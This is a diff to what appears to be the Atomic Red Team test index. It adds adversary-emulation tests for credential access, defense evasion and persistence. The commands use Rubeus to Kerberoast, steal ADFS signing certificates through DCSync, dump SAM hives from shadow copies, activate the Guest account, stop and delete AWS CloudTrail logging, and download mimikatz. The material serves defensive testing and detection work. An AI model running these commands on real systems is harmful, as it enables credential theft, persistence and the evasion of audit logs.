@@ -240,7 +240,64 @@ credential-access:
       - Dan Nutting, @KerberToast
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1558.004
+    atomic_tests:
+    - name: Rubeus asreproast
+      auto_generated_guid: 615bd568-2859-41b5-9aed-61f6a88e48dd
+      description: |
+        Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
+        This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_folder:
+          description: Local path of Rubeus executable
+          type: Path
+          default: "$Env:temp"
+        local_executable:
+          description: name of the rubeus executable
+          type: String
+          default: rubeus.exe
+        out_file:
+          description: file where command results are stored
+          type: String
+          default: rubeus_output.txt
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      - description: 'Rubeus must exist
+
+'
+        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
+
+'
+      executor:
+        command: 'cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}"
+
+'
+        cleanup_command: 'Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: false
   T1552.003:
     technique:
       external_references:
@@ -1527,7 +1584,8 @@ credential-access:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -2014,7 +2072,8 @@ credential-access:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -2363,6 +2422,68 @@ credential-access:
           iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
           Invoke-Kerberoast | fl
         name: powershell
+    - name: Rubeus kerberoast
+      auto_generated_guid: 14625569-6def-4497-99ac-8e7817105b55
+      description: |
+        Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
+        This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_folder:
+          description: Local path of Rubeus executable
+          type: Path
+          default: "$Env:temp"
+        local_executable:
+          description: name of the rubeus executable
+          type: String
+          default: rubeus.exe
+        out_file:
+          description: file where command results are stored
+          type: String
+          default: rubeus_output.txt
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+        flags:
+          description: command flags you would like to run (optional and blank by
+            default)
+          type: String
+          default: 
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      - description: 'Rubeus must exist
+
+'
+        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
+
+'
+      executor:
+        command: 'cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags}
+          /outfile:"#{local_folder}\#{out_file}"
+
+'
+        cleanup_command: 'Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: false
   T1555.001:
     technique:
       created: '2020-02-12T18:55:24.728Z'
@@ -3030,15 +3151,8 @@ credential-access:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
-          $request = [System.Net.WebRequest]::Create($url)
-          $response = $request.GetResponse()
-          $realTagUrl = $response.ResponseUri.OriginalString
-          $version = $realTagUrl.split('/')[-1]
-          $fileName = 'mimikatz_trunk.zip'
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $realDownloadUrl =$realTagUrl.Replace('tag','download') + '/' + $fileName
-          Invoke-WebRequest $realDownloadUrl -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -5072,6 +5186,99 @@ credential-access:
 
 '
         name: sh
+    - name: ADFS token signing and encryption certificates theft - Local
+      auto_generated_guid: 78e95057-d429-4e66-8f82-0f060c1ac96f
+      description: |
+        Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.
+        Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AADInternals module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AADInternals) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AADInternals -Force
+
+'
+      executor:
+        command: |
+          Import-Module AADInternals -Force
+          Export-AADIntADFSCertificates
+          Get-ChildItem | Where-Object {$_ -like "ADFS*"}
+          Write-Host "`nCertificates retrieved successfully"
+        cleanup_command: |
+          Remove-Item -Path ".\ADFS_encryption.pfx"
+          Remove-Item -Path ".\ADFS_signing.pfx"
+        name: powershell
+    - name: ADFS token signing and encryption certificates theft - Remote
+      auto_generated_guid: cab413d8-9e4a-4b8d-9b84-c985bd73a442
+      description: |
+        Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.
+        Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfs_service_account_name:
+          description: Name of the ADFS service account
+          type: String
+          default: adfs_svc
+        replication_user:
+          description: Username with replication rights. It can be the Domain Admin
+            running the script
+          type: String
+          default: Administrator
+        replication_password:
+          description: Password of replication_username
+          type: String
+          default: ReallyStrongPassword
+        adfs_server_name:
+          description: Name of an ADFS server
+          type: String
+          default: sts.contoso.com
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AADInternals and ActiveDirectory modules must be installed.
+
+'
+        prereq_command: 'if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable
+          -Name ActiveDirectory)) {echo 0} else {echo 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AADInternals -Force
+
+'
+      executor:
+        command: "Import-Module ActiveDirectory -Force \nImport-Module AADInternals
+          -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc
+          = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object
+          name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString
+          -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object
+          -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user},
+          $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash
+          = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential
+          -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration
+          -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get
+          certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group =
+          $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container
+          = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent
+          = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base
+          = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter
+          = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\")
+          | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"]
+          \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\")
+          | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne()
+          \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted
+          certificates from configuration and decrypt them\nExport-AADIntADFSCertificates
+          -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like
+          \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n"
+        cleanup_command: |
+          Remove-Item -Path ".\ADFS_encryption.pfx"
+          Remove-Item -Path ".\ADFS_signing.pfx"
+        name: powershell
   T1003.007:
     technique:
       external_references:
@@ -5440,6 +5647,75 @@ credential-access:
           Invoke-PowerDump
         name: powershell
         elevation_required: true
+    - name: dump volume shadow copy hives with certutil
+      auto_generated_guid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
+      description: |
+        Dump hives from volume shadow copies with the certutil utility
+        This can be done with a non-admin user account
+      supported_platforms:
+      - windows
+      input_arguments:
+        dump_path:
+          description: Path where the hive will be dumped
+          type: Path
+          default: "$ENV:temp"
+        target_hive:
+          description: Hive you wish to dump
+          type: String
+          default: SAM
+        dumped_hive:
+          description: Name of the dumped hive
+          type: String
+          default: myhive
+      executor:
+        command: |
+          write-host ""
+          $shadowlist = get-wmiobject win32_shadowcopy
+          $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}
+          $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]
+          $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"
+          certutil -f -v -encodehex $shadowpath #{dump_path}\#{dumped_hive} 2
+        name: powershell
+        elevation_required: false
+        cleanup_command: |
+          write-host ""
+          $toremove = #{dump_path} + "\" + '#{dumped_hive}'
+          rm $toremove
+    - name: dump volume shadow copy hives with System.IO.File
+      auto_generated_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
+      description: 'Dump hives from volume shadow copies with System.IO.File
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dump_path:
+          description: Path where the hive will be dumped
+          type: Path
+          default: "$ENV:temp"
+        target_hive:
+          description: Hive you wish to dump
+          type: String
+          default: SAM
+        dumped_hive:
+          description: Name of the dumped hive
+          type: String
+          default: myhive
+      executor:
+        command: |
+          write-host ""
+          $shadowlist = get-wmiobject win32_shadowcopy
+          $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}
+          $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]
+          $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"
+          $mydump = #{dump_path} + '\' + '#{dumped_hive}'
+          [System.IO.File]::Copy($shadowpath , $mydump)
+        name: powershell
+        elevation_required: false
+        cleanup_command: |-
+          write-host ""
+          $toremove = #{dump_path} + "\" + '#{dumped_hive}'
+          rm $toremove
   T1555.002:
     technique:
       external_references:
@@ -8851,6 +9127,31 @@ collection:
         cleanup_command: 'rm #{output_file} -ErrorAction Ignore
 
 '
+    - name: Windows Screen Capture (CopyFromScreen)
+      auto_generated_guid: e9313014-985a-48ef-80d9-cde604ffc187
+      description: |
+        Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.
+
+        [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: Path
+          default: "$env:TEMP\\T1113.png"
+      executor:
+        command: |
+          Add-Type -AssemblyName System.Windows.Forms
+          $screen = [Windows.Forms.SystemInformation]::VirtualScreen
+          $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+          $graphic = [Drawing.Graphics]::FromImage($bitmap)
+          $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+          $bitmap.Save("#{output_file}")
+        cleanup_command: 'Remove-Item #{output_file} -ErrorAction Ignore
+
+'
+        name: powershell
   T1213.002:
     technique:
       external_references:
@@ -11659,6 +11960,23 @@ privilege-escalation:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1078.002:
@@ -15603,7 +15921,8 @@ privilege-escalation:
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -21886,6 +22205,23 @@ defense-evasion:
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
         name: command_prompt
         elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
+        name: command_prompt
+        elevation_required: true
   T1578.003:
     technique:
       external_references:
@@ -22462,7 +22798,50 @@ defense-evasion:
       - Matt Snyder, VMware
       x_mitre_platforms:
       - IaaS
-    atomic_tests: []
+      identifier: T1562.008
+    atomic_tests:
+    - name: AWS CloudTrail Changes
+      auto_generated_guid: 9c10dc6b-20bd-403a-8e67-50ef7d07ed4e
+      description: 'Creates a new cloudTrail in AWS, Upon successful creation it will
+        Update,Stop and Delete the cloudTrail
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        cloudtrail_name:
+          description: Name of the cloudTrail
+          type: String
+          default: redatomictesttrail
+        s3_bucket_name:
+          description: Name of the bucket
+          type: String
+          default: redatomic-test
+        region:
+          description: Name of the region
+          type: String
+          default: us-east-1
+      dependencies:
+      - description: 'Check if ~/.aws/credentials file has a default stanza is configured
+
+'
+        prereq_command: |
+          cat ~/.aws/credentials | grep "default"
+          aws s3api create-bucket --bucket #{s3_bucket_name} --region #{region}
+          aws s3api put-bucket-policy --bucket #{s3_bucket_name} --policy file://$PathToAtomicsFolder/T1562.008/src/policy.json
+        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
+          defult profile using: aws configure
+
+'
+      executor:
+        command: |
+          aws cloudtrail create-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name} --region #{region}
+          aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}
+          aws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}
+          aws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}
+        cleanup_command: "aws s3 rb s3://#{s3_bucket_name} --force \n"
+        name: sh
+        elevation_required: false
   T1600.002:
     technique:
       id: attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5
@@ -30428,7 +30807,8 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -30587,7 +30967,8 @@ defense-evasion:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -31718,7 +32099,8 @@ defense-evasion:
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -32908,7 +33290,8 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -37573,7 +37956,31 @@ persistence:
       x_mitre_platforms:
       - Windows
       - Office 365
-    atomic_tests: []
+      identifier: T1137.006
+    atomic_tests:
+    - name: Code Executed Via Excel Add-in File (Xll)
+      auto_generated_guid: 441b1a0f-a771-428a-8af0-e99e4698cda3
+      description: "Downloads a XLL file and loads it using the excel add-ins library.\nThis
+        causes excel to display the message \"Hello World\"\nSource of XLL - https://github.com/edparcell/HelloWorldXll
+        \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        xll_url:
+          description: url of the file HelloWorldXll.xll
+          type: url
+          default: https://https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1137.006/bin/HelloWorldXll.xll?raw=true
+        local_file:
+          description: name of the xll file
+          type: path
+          default: "$env:tmp\\HelloWorldXll.xll"
+      executor:
+        name: powershell
+        elevation_required: true
+        command: 'powershell -c "iwr -URI ''#{xll_url}'' -o ''#{local_file}''; IEX
+          ((new-object -ComObject excel.application).RegisterXLL(''$env:tmp\HelloWorldXll.xll''))"
+
+'
   T1098.001:
     technique:
       external_references:
@@ -40344,6 +40751,23 @@ persistence:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1136.002:
@@ -62995,7 +63419,8 @@ lateral-movement:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -63154,7 +63579,8 @@ lateral-movement:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -68795,6 +69221,23 @@ initial-access:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1078.002:
